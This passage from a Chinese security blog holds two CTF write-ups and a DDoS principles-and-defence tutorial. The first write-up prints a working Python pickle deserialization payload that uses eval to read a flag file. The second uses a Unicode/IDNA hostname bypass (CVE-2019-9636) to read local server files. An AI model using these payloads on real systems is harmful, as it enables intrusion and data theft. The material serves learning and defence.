<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            <span class="comment"># pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</span></span><br><span class="line">            <span class="comment">#             # pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，</span></span><br><span class="line">            <span class="comment">#             # pickle序列化后的数据，可读性差，人一般无法识别。</span></span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="comment"># urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式</span></span><br><span class="line">            <span class="comment"># pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</span></span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055">大佬讲Python魔法方法的blog</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxnyi1j30nm0jcq9a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxnyi1j30nm0jcq9a.jpg" class="lazyload"></a></p>
<h3 id="payload-生成become参数的-，py2-7版本运行"><a href="#payload-生成become参数的-，py2-7版本运行" class="headerlink" title="payload[生成become参数的 ，py2.7版本运行]:"></a>payload[生成become参数的 ，py2.7版本运行]:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"><span class="comment"># __reduce__:当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。</span></span><br><span class="line"><span class="comment"># __reduce__ 被定义之后，当对象被Pickle时就会被调用。</span></span><br><span class="line"><span class="comment"># 它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。</span></span><br><span class="line"><span class="comment"># 这个元组包含2到5个元素，其中包括：</span></span><br><span class="line"><span class="comment">#       一个可调用的对象，用于重建对象时调用；【我们这里的eval】</span></span><br><span class="line"><span class="comment">#       一个参数元素，供那个可调用对象使用； 【我们这里的open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()】</span></span><br><span class="line"><span class="comment">#       被传递给 __setstate__ 的状态（可选）；</span></span><br><span class="line"><span class="comment">#       一个产生被pickle的列表元素的迭代器（可选）；</span></span><br><span class="line"><span class="comment">#       一个产生被pickle的字典元素的迭代器（可选）</span></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="comment"># pickle.dumps(obj)：以字节对象形式返回封装的对象，不需要写入文件中</span></span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure></div>

<p>这样就可以打印 <code>flag.txt</code> 里的内容了<br>将生成的payload传给 <code>become</code>，得到flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxpo4lj316w0iyn63.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxpo4lj316w0iyn63.jpg" class="lazyload"></a></p>
<p>然后这里遇到一个坑，上图在BP中，圈出来的 <code>POST</code>，直接将拦截到的 <code>GET</code> 改成 <code>POST</code> 会被waf，回显403，这是因为在http里，<code>GET</code> 方法提交数据时，数据会以 <code>&amp;</code> 符号作为分隔符的形式，在URL后面添加需要提交的参数，而 <code>POST</code> 不用再地址栏输入，因此要右键选择更改 <code>请求方法</code>。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxjbowj30ct0csac3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxjbowj30ct0csac3.jpg" class="lazyload"></a></p>
<hr>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>考点类似 <code>[HCTF 2018]admin</code> 的 Unicode 欺骗<br><code>CVE-2019-9636</code> ：urlsplit不处理NFKC标准化 <a href="https://bugs.python.org/issue36216">CVE点这里</a></p>
<h2 id="以及Nginx重要文件位置"><a href="#以及Nginx重要文件位置" class="headerlink" title="以及Nginx重要文件位置"></a>以及Nginx重要文件位置<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br></pre></td></tr></table></figure></div></h2><p>点开链接，发现有源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">        @app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>源码要求构造出第三次判断的时候是suctf.cc但是在前两个判断的时候又不能是suctf.cc，所以就是其中的字符在第三次判断前处理后要变成suctf.cc了。</p>
<p>那就找一个 <a href="https://unicode.org/cldr/utility/character.jsp?a=1D56E&B1=Show">可用的字符代替</a><br>用来试一下文件读取<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxjasmj30vc0bm0t9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxjasmj30vc0bm0t9.jpg" class="lazyload"></a></p>
<p>再尝试读一下 <code>/etc/hosts</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1 localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">174.0.8.138 57da336a19c9</span><br><span class="line">127.0.0.1     suctf.cc</span><br></pre></td></tr></table></figure></div>

<p>然后读到 <code>/usr/local/nginx/conf/nginx.conf</code> 文件时，关键来了，payload <code>/usr/fffffflag</code> 得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># location /flag &#123;</span></span><br><span class="line">    <span class="comment">#     alias /usr/fffffflag;</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DDoS原理与防御</title>
    <url>/yakko117/2020/03/29/Ddos%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>感觉自己最近很颓废，因为一点小事就想着逃避，然后摸鱼摸一天<br>为什么要写这篇，主要是因为考试考到了，所以记录学习一下<br>                                – 懒狗发言</p>
<h1 id="DDoS简介"><a href="#DDoS简介" class="headerlink" title="DDoS简介"></a>DDoS简介</h1><p>**DDoS(Distributed Denial of Service)**，又称分布式拒绝服务攻击。<br>通过控制多个肉鸡或服务器组成的僵尸网络，对目标发送大量看似合法请求，从而占用大量网络资源，瘫痪网络，阻止用户对网络资源o的正常访问。</p>
<h2 id="DDoS危害"><a href="#DDoS危害" class="headerlink" title="DDoS危害"></a>DDoS危害</h2><p>出口带宽堵死<br>游戏掉线导致客户流失<br>服务器连接数多，连接资源被耗尽<br>服务器卡、慢、死机、无法连接</p>
<h2 id="攻击来源"><a href="#攻击来源" class="headerlink" title="攻击来源"></a>攻击来源</h2><p>高性能服务器配合发包软件<br>可联网的设备(如打印机、摄像头、电视等等)<br>移动设备(数量多，增长速度快，其高性能利于组建僵尸网络)<br>个人PC(存在漏洞的PC或一些黑客迷自愿成为DDOS一员)<br>骇客控制的僵尸网络(僵尸网络又分为IRC型、HTTP型、P2P型)</p>
<h2 id="流量特点"><a href="#流量特点" class="headerlink" title="流量特点"></a>流量特点</h2><p>IP地址随机或固定某些IP段随机<br>没有完整完成三次握手<br>地址多数是伪造的<br>请求数量大、快</p>
<h2 id="导致DDoS原因"><a href="#导致DDoS原因" class="headerlink" title="导致DDoS原因"></a>导致DDoS原因</h2><p>个人因素：金钱利益 政治冲突 宗教冲突 为求出名</p>
<p>服务带宽上限 网络协议存在缺陷<br>服务器设备性能上限<br>应用性能上限<br>系统性能上限</p>
<hr>
<h1 id="攻击类型及防御"><a href="#攻击类型及防御" class="headerlink" title="攻击类型及防御"></a>攻击类型及防御</h1><h2 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h2><p>攻击者向网关发送 <code>ICMP请求包</code>，并将该 <code>ICMP请求报文的源地址</code> 伪造成 <code>受害主机IP地址</code>，目的地址为广播地址。<br>路由器在接受到该数据包，发现目的地址是<strong>广播地址</strong>，就会将该数据包广播出去，局域网内所有的 <strong>存活主机</strong> 都会受到一个 <code>ICMP请求包</code>，<strong>源地址是受害主机IP</strong>。接下来受害主机就会收到该网络内所有主机发来的 <code>ICMP应答报文</code> ，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" data-fancybox="group" data-caption="ddos_1" class="fancybox"><img alt="ddos_1" title="ddos_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" class="lazyload"></a></p>
<p>防护方案：</p>
<ul>
<li>禁止路由器广播ICMP请求包；</li>
<li>禁止操作系统对广播发出的ICMP请求包做出响应；</li>
<li>配置防火墙静止来自你所处网络外部的ping包</li>
</ul>
<hr>
<h2 id="TearDrop-Attack"><a href="#TearDrop-Attack" class="headerlink" title="TearDrop Attack"></a>TearDrop Attack</h2><p>在了解这种攻击之前，需要先知道什么是 <code>IP fragmentation(数据包分片)</code>。数据在网络中传输必定会产生数据包被分片，因为每种网络都有不同的最大单个数据包的大小，也就是常说的 <code>MTU (Maximum Transmission Unit，最大传输单元)</code>。当要传输的数据超过你要通信的那台主机所处网络的MTU时，数据包就会被分片进行传输，然后在到达目的地再重新组装成原来的数据包，下面是数据包分片重组过程</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" data-fancybox="group" data-caption="ddos_2" class="fancybox"><img alt="ddos_2" title="ddos_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" class="lazyload"></a></p>
<p><code>TearDrop Attack</code>，就是通过设置错误的片偏移，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" data-fancybox="group" data-caption="ddos_3" class="fancybox"><img alt="ddos_3" title="ddos_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" class="lazyload"></a></p>
<p>对比一下正常IP数据包和错误IP数据包</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" data-fancybox="group" data-caption="ddos_4" class="fancybox"><img alt="ddos_4" title="ddos_4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" class="lazyload"></a></p>
<p>这种攻击主要对旧的windows版本和Linux版本有效，防护的话，可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。例如这个：<a href="https://wenku.baidu.com/view/b45bba61ddccda38376baf7f.html">分片重组检查算法 &lt;- link</a>。</p>
<p>网络安全设备将接收到的<strong>分片报文</strong>先放入<strong>缓存</strong>中，并根据<strong>源IP地址</strong>和<strong>目的IP地址</strong>对报文进行分组，源IP地址和目的IP地址均相同的报文归入同一组，然后对每组IP报文的相关分片信息进行检查，<strong>丢弃分片信息存在错误的报文</strong>。为了防止缓存益处，当缓存快要存满是，直接丢弃后续分片报文。</p>
<hr>
<h2 id="Land-Attack"><a href="#Land-Attack" class="headerlink" title="Land Attack"></a>Land Attack</h2><p>攻击者发动 <code>Land Attack</code> 攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。攻击过程如下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" data-fancybox="group" data-caption="ddos_5" class="fancybox"><img alt="ddos_5" title="ddos_5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" class="lazyload"></a></p>
<p><strong>防御方案</strong>:</p>
<ul>
<li>通过<strong>设置防火墙和路由规则</strong>，检测源IP与目的IP相同的数据包，丢弃、过滤这种数据包。(类似上述的 <font color="6495ED">TearDrop Attack</font>)</li>
</ul>
<hr>
<h2 id="SYN-flood-attack-几个值得了解的关键点来了"><a href="#SYN-flood-attack-几个值得了解的关键点来了" class="headerlink" title="SYN flood attack (几个值得了解的关键点来了)"></a>SYN flood attack (几个值得了解的关键点来了)</h2><p><code>SYN flood attack</code> 是在TCP三次握手过程中产生的。攻击者通过发送大量伪造的带有<font color="6495ED">SYN标志位的TCP报文</font>，与目标主机建立了很多虚假的<strong>半开连接</strong>，在服务器返回<font color="6495ED">SYN+ACK数据包</font>后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" data-fancybox="group" data-caption="ddos_6" class="fancybox"><img alt="ddos_6" title="ddos_6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" class="lazyload"></a></p>
<p><strong>防御方案</strong>:</p>
<ul>
<li><p><font color="6495ED">SYN Check</font>：使用防护设备，<strong>3次握手变成了6次握手</strong>，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。</p>
</li>
<li><p><font color="6495ED">Micro blocks</font>：管理员可以在内存中**为每个SYN请求创建一个小索引(小于16字节)**，而不必把整个连接对象存入内存。</p>
</li>
<li><p><font color="6495ED">RST cookies</font>：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。</p>
</li>
<li><p><font color="6495ED">STACK tweaking</font>：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括<strong>减小超时时间</strong>，<strong>等到堆栈存释内放时再分配连接</strong>，否则就随机性地删除传入的连接。</p>
</li>
</ul>
<h2 id="ACK-Flood-Attack"><a href="#ACK-Flood-Attack" class="headerlink" title="ACK Flood Attack"></a>ACK Flood Attack</h2><p><code>ACK Flood Attack</code> 是利用TCP三次握手过程。这里可以分为两种。</p>
<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p><strong>攻击者</strong>伪造大量的 <code>SYN+ACK包</code> 发送给目标主机，目标主机每收到一个 <code>SYN+ACK数据包</code> 时，都会去<strong>自己的TCP连接表中查看有没有与ACK的发送者建立连接</strong> ，<strong>如果有则发送ACK包完成TCP连接，如果没有则发送 ACK+RST 断开连接</strong>。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致<font color="6495ED">正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。</font></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" data-fancybox="group" data-caption="ddos_7" class="fancybox"><img alt="ddos_7" title="ddos_7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" class="lazyload"></a></p>
<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p><strong>利用TCP三次握手的ACK+SYN应答</strong>，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。</p>
<p>通常DDOS攻击会将ACK flood与SYN flood结合在一起，从而扩大威力。<br><strong>防御方案</strong>可参考如下：</p>
<ul>
<li>采用CDN进行流量稀释；</li>
<li>避免服务器IP暴露在公网上；</li>
<li>通过限速或动态指纹的方式；</li>
<li>利用对称性判断来分析出是否有攻击存在；</li>
<li>在连续收到用户发送的ACK包时，中断回话，让其重连。</li>
</ul>
<h2 id="UDP-FLood-Attack"><a href="#UDP-FLood-Attack" class="headerlink" title="UDP FLood Attack"></a>UDP FLood Attack</h2><p><code>UDP</code>（<code>User Datagram Protocol</code>，用户数据报协议），是一种<strong>无连接和无状态的网络协议</strong>，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。<code>UDP FLood</code> 可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。大量小数据包会增大网络设备处理数据包的压力；而对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是<strong>占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" data-fancybox="group" data-caption="ddos_8" class="fancybox"><img alt="ddos_8" title="ddos_8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" class="lazyload"></a></p>
<p><strong>防御方案</strong>：</p>
<ul>
<li>限制每秒钟接受到的流量(可能产生误判)；</li>
<li>通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。</li>
</ul>
<hr>
<h2 id="NTP放大攻击-初步只作点了解"><a href="#NTP放大攻击-初步只作点了解" class="headerlink" title="NTP放大攻击(初步只作点了解)"></a>NTP放大攻击(初步只作点了解)</h2><p><code>NTP</code> (<code>Network Time Protocol</code>，网络时间协议)，是用来使计算机网络时间同步化的一种协议，它可以使计算机与时钟源进行同步化并提供高精度的时间校正，使用 <code>UDP 123</code> 端口进行通信。<br>通常在NTP服务器上会有一些调试接口，而 <strong>利用这些接口中的monlist请求，就可触发放大攻击。</strong> 当<strong>主机</strong>向 <code>NTP服务器</code> 发送 <strong>monlist查询请求</strong> 时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。</p>
<p>总结一下这种攻击产生的原因:</p>
<ul>
<li>请求与响应数据包不等价；</li>
<li>UDP协议的通信模糊性（无数据传输确认机制）；</li>
<li>NTP服务器的无认证机制。</li>
</ul>
<p>再来谈谈<strong>防御方案</strong>：</p>
<ul>
<li>使用防 <code>DDoS</code> 设备进行清洗；</li>
<li>加固并升级NTP服务器；</li>
<li>在网络出口封禁 <code>UDP 123</code> 时间同步端口；</li>
<li>通过网络层或者借助运营商实施 <code>ACL</code> 来防御；</li>
<li>关闭现在 <code>NTP</code> 服务的 <code>monlist</code> 功能，在 <code>ntp.conf</code>配置文件中增加<code>disable monitor</code> 选项。</li>
</ul>
<hr>
<h2 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a>DNS放大攻击</h2><p>DNS(Domain Name System，域名系统)，由于使用IP地址来记忆各个网站比较困难，所以就产生了使用主机名称来表示对应的服务器，主机名称通过域名解析的过程转换成IP地址。下面来看一下DNS报文格式，以便了解攻击发生在何处。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" data-fancybox="group" data-caption="ddos_9" class="fancybox"><img alt="ddos_9" title="ddos_9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" class="lazyload"></a></p>
<p><strong>报文首部格式</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" data-fancybox="group" data-caption="ddos_10" class="fancybox"><img alt="ddos_10" title="ddos_10" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" class="lazyload"></a></p>
<p>报文首部各字段含义如下，其中高亮是攻击点之一</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" data-fancybox="group" data-caption="ddos_11" class="fancybox"><img alt="ddos_11" title="ddos_11" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" class="lazyload"></a></p>
<p>下面是问题记录中查询类型可设置的值，发现最后一个ANY类型会请求所有记录，这也是一个攻击点</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" data-fancybox="group" data-caption="ddos_12" class="fancybox"><img alt="ddos_12" title="ddos_12" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" class="lazyload"></a></p>
<h3 id="DNS递归查询"><a href="#DNS递归查询" class="headerlink" title="DNS递归查询"></a>DNS递归查询</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" data-fancybox="group" data-caption="ddos_13" class="fancybox"><img alt="ddos_13" title="ddos_13" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" class="lazyload"></a></p>
<h3 id="DNS递归查询-1"><a href="#DNS递归查询-1" class="headerlink" title="DNS递归查询"></a>DNS递归查询</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" data-fancybox="group" data-caption="ddos_14" class="fancybox"><img alt="ddos_14" title="ddos_14" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" class="lazyload"></a></p>
<p>从DNS数据包结构以及DNS递归查询过程，我们就可以大致分析出攻击原理。<br>首先，攻击者向 <strong>僵尸网络</strong> 发出指令，使僵尸网络中的每一台主机均发出一个 <strong>伪造源地址的DNS查询请求包</strong>，这些<strong>请求包查询类型设置为ANY</strong>，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。</p>
<p>接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，<strong>如果迭代查询第一个请求的DNS服务器没有查询到结果</strong>，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而 <strong><font color="6495ED">攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的</font></strong>;</p>
<p>而<strong>递归查询</strong>却是在查询到结果之后，才返回给查询请求发起者。<br>利用这两个特点，攻击者就可以成功发起DNS放大攻击。<br>这种普通的查询请求可以<strong>将攻击流量放大2~10倍</strong>，如果想增大攻击倍数，可以使用 <code>RFC 2671</code> 中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了 <code>OPT RR</code> 字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。</p>
